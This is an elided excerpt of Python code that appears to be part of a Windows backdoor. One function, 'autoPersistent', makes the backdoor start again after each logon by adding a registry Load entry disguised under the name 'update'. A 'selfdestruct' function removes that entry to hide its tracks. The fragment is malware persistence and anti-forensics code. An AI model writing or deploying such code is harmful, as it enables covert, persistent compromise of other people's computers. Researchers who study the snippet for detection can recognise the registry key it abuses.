...
def autoPersistent():
    ...
    if not os.path.exists(backdoor_location):
        ...
        sp.call(
            ...
            'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load" /v update /t REG_SZ /d "' + backdoor_location + '" /f',
            shell=True)
...
def selfdestruct():
    try:
        ...
        sp.call(
                ...
                'reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load /v update /f',
                shell=True)
        return True
